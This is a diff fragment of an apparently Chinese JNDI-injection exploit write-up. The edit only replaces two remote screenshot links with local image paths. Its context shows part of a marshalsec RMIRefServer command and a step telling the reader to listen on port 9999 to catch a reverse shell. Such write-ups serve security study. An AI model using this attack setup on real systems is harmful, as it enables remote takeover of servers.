@@ -72,9 +72,9 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 }
 ```
 
-![image-20220223130855285](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231308359.png)
+![image-20220223130855285](./images/202202231308359.png)
 
 监听9999端口，接收反弹shell：
 
-![image-20220223130812872](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231308945.png)
+![image-20220223130812872](./images/202202231308945.png)
 
